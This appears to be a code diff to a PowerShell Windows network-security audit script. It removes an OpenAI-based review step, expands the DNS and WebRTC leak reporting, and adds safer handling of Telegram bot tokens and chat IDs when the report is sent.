-          secure_boot=$secureBoot
-          bitlocker_os=if($systemVolume){[string]$systemVolume.ProtectionStatus}else{'unknown'}
-          defender_realtime=if($defender){$defender.RealTimeProtectionEnabled}else{$null}
-          ping_loss_percent=$pingWan.loss_percent;ping_avg_ms=$pingWan.avg_ms
-          wifi_signal_percent=$wifi.signal_percent
-          dns_test_status=$dnsLeak.status;dns_resolver_count=$dnsLeak.observed_resolvers.Count
-          webrtc_status=$webrtc.status;webrtc_public_mismatch_count=$webrtcMismatch.Count
-          gateway_port_check_enabled=[bool]$CheckGatewayPorts
-        }
-        $request=[ordered]@{
-          model=$OpenAiModel;store=$false;max_output_tokens=1050
-          instructions='You are a defensive Windows security analyst. Write ONLY a factual bilingual report: RU section then EN section. Each section 3-5 concise bullets: verdict, top risks, next actions, limits. Use the supplied evidence only. Do not invent CVEs, vulnerabilities, exploitability or confirmation that DNS/WebRTC is leak-free. A heuristic score is not penetration testing. No offensive steps. No markdown tables.'
-          input=('Review this sanitized audit JSON: '+($facts | ConvertTo-Json -Depth 8 -Compress))
-        }
-        $bodyBytes=[Text.Encoding]::UTF8.GetBytes(($request | ConvertTo-Json -Depth 12 -Compress))
-        $reply=Invoke-RestMethod -Uri 'https://api.openai.com/v1/responses' -Method Post -Headers @{Authorization="Bearer $OpenAiApiKey"} -ContentType 'application/json; charset=utf-8' -Body $bodyBytes -TimeoutSec 55
-        $parts=@(foreach($item in $reply.output){foreach($c in $item.content){if($c.type -eq 'output_text'){$c.text}}})
-        $aiResult=($parts -join "`n").Trim()
-        if(-not $aiResult){throw 'API returned no output_text'}
-        $aiState='completed'
-    } catch {$aiState='failed: '+$_.Exception.Message;$errorsList.Add('OpenAI: '+$_.Exception.Message)}
-}
-$report.assessment['ai_review_status']=$aiState
-if($aiResult){$report.assessment['ai_review_ru_en']=$aiResult}
-$report.collection_errors=@($errorsList)
-($report | ConvertTo-Json -Depth 16) | Set-Content -Path $jsonPath -Encoding UTF8
+# OpenAI / external AI review deliberately removed by request.
+# Every report conclusion comes from deterministic rules and evidence.
 
 Write-Host '[6/6] Telegram report and local copy' -ForegroundColor Cyan
 $overview=@"
@@ -453,13 +526,20 @@ Sensitive listening ports: $(if(@($exposedListeners).Count){(@($exposedListeners
 Gateway port checks: $(if($CheckGatewayPorts){($gatewayPorts | ConvertTo-Json -Compress)}else{'not requested'})
 
 🧪 LEAK TESTS / УТЕЧКИ
-DNS: $($dnsLeak.status)
-Observed DNS resolvers: $($dnsLeak.observed_resolvers.Count)
-DNS provider conclusion: $(OneLine $dnsLeak.vendor_conclusion 'Not reported')
-$(if($IncludeLocalDetails){'Resolver IPs: '+(@($dnsLeak.observed_resolvers | ForEach-Object {$_.ip}) -join ', ')}else{'Resolver IPs omitted from Telegram'})
-WebRTC: $($webrtc.status)
-WebRTC public IP mismatch: $(@($webrtcMismatch).Count)
-⚠ Leak-free status cannot be certified without VPN baseline and browser coverage.
+System DNS: $($dnsLeak.status)
+System observed resolvers: $($dnsLeak.observed_resolvers.Count)
+System DNS verdict (provider): $(OneLine $dnsLeak.vendor_conclusion 'Not reported')
+$(if($IncludeLocalDetails){'System resolver IPs: '+(@($dnsLeak.observed_resolvers | ForEach-Object {$_.ip}) -join ', ')}else{'System DNS IPs omitted from Telegram'})
+Browser DNS: $($browserDns.status)
+Browser observed resolvers: $($browserDns.observed_resolvers.Count)
+Browser DNS verdict (provider): $(OneLine $browserDns.vendor_conclusion 'Not reported')
+$(if($IncludeLocalDetails){'Browser resolver IPs: '+(@($browserDns.observed_resolvers | ForEach-Object {$_.ip}) -join ', ')}else{'Browser DNS IPs omitted from Telegram'})
+WebRTC status: $($webrtc.status)
+WebRTC STUN public IPv4: $($webrtcPublicCandidates -join ', ')
+WebRTC HTTP/IP discrepancy: $($webrtcMismatch.Count)
+WebRTC host IPs: $(if($IncludeLocalDetails){$webrtcHostIPs -join ', '}else{'omitted from Telegram'})
+Expected VPN IP: $(OneLine $ExpectedVpnPublicIPv4 'not provided')
+⚠ Different DNS/IP paths are indicators, not definitive leaks without expected baseline.
 
 🇷🇺 ИТОГ
 $($assessment.local_summary_ru)
@@ -468,21 +548,38 @@ $($assessment.local_summary_ru)
 $($assessment.local_summary_en)
 "@
 if($SendTelegram) {
+    if([string]::IsNullOrWhiteSpace($TelegramBotToken) -or $TelegramBotToken -eq 'PASTE_NEW_BOT_TOKEN_HERE') {
+        Write-Warning 'Telegram skipped: put a NEW token in TG_BOT_TOKEN (PowerShell env var). Current leaked token should be revoked.'
+        $SendTelegram=$false
+    } elseif(@(Tg-TargetIds).Count -eq 0) {
+        Write-Warning 'Telegram skipped: no valid numeric chat IDs.'
+        $SendTelegram=$false
+    }
+}
+if($SendTelegram) {
     try {
         Send-TgLong 'Network Audit • 1/3 • Network' $overview
         Send-TgLong 'Network Audit • 2/3 • Security' $securityText
         $issues=@($findings | ForEach-Object {"[$($_.level)] RU: $($_.ru)`nEN: $($_.en)"})
         if($issues.Count -gt 0){Send-TgLong 'Network Audit • 3/3 • Findings' ($issues -join "`n`n")}
-        if($aiResult){Send-TgLong 'AI Security Reviewer • RU + EN' $aiResult}
-        elseif($OpenAiApiKey){Send-TgLong 'AI Review Status' $aiState}
-        else{Send-TgLong 'AI Review Status' 'Not run: OPENAI_API_KEY missing. Local scoring is rule-based, not an AI review.'}
+        Send-TgLong 'Audit method / Метод проверки' 'RULE-BASED LOCAL ASSESSMENT. No AI API is called. Checks are not penetration testing.
+ОЦЕНКА ПО ЛОКАЛЬНЫМ ПРАВИЛАМ. Вызовов ИИ нет. Проверки не заменяют пентест.'
         Send-TgDocument $jsonPath
-        Write-Host 'Telegram messages sent to the configured chat IDs.' -ForegroundColor Green
-    } catch {Write-Warning ('Telegram failed: '+$_.Exception.Message)}
+        if($sentTo.Count -gt 0){Write-Host ('Telegram delivered to chat ID(s): '+($sentTo.ToArray() -join ', ')) -ForegroundColor Green}
+        if($telegramFailures.Count -gt 0){
+            foreach($failure in $telegramFailures.ToArray()){Write-Warning $failure}
+            Write-Warning 'If Telegram returns 403, the user must open the bot and press START. 400 may mean invalid chat ID.'
+        }
+
+    } catch {Write-Warning ('Telegram failed: '+$_.Exception.Message.Replace($TelegramBotToken,'[BOT_TOKEN_REDACTED]'))}
 }
 $summaryPath=Join-Path $OutputDir ("network_audit_${stamp}.txt")
-(@($overview,$securityText,('FINDINGS / НАХОДКИ' + "`n" + ((@($findings | ForEach-Object {$_.ru+' / '+$_.en}) -join "`n"))),('AI REVIEW' + "`n" + (OneLine $aiResult $aiState))) -join "`n`n") | Set-Content -Path $summaryPath -Encoding UTF8
+(@($overview,$securityText,('FINDINGS / НАХОДКИ' + "`n" + ((@($findings | ForEach-Object {$_.ru+' / '+$_.en}) -join "`n"))),('ASSESSMENT METHOD' + "`n" + 'Local deterministic rules only; no AI API used')) -join "`n`n") | Set-Content -Path $summaryPath -Encoding UTF8
 Write-Host "JSON: $jsonPath" -ForegroundColor Green
 Write-Host "TXT:  $summaryPath" -ForegroundColor Green
+if($telegramFailures.Count -gt 0){
+    ('TELEGRAM SEND ERRORS' + "`n" + ($telegramFailures.ToArray() -join "`n")) | Add-Content -Path $summaryPath -Encoding UTF8
+}
+
 Write-Host "FINAL: $score/100 | $tier | Confidence: $confidence" -ForegroundColor Yellow
-if(-not $SendTelegram){Write-Host 'Telegram disabled: pass -SendTelegram after setting TG_BOT_TOKEN and TG_CHAT_IDS.' -ForegroundColor DarkYellow}
+if(-not $SendTelegram){Write-Host 'Telegram not sent (disabled or missing token). Set TG_BOT_TOKEN to enable sending.' -ForegroundColor DarkYellow}
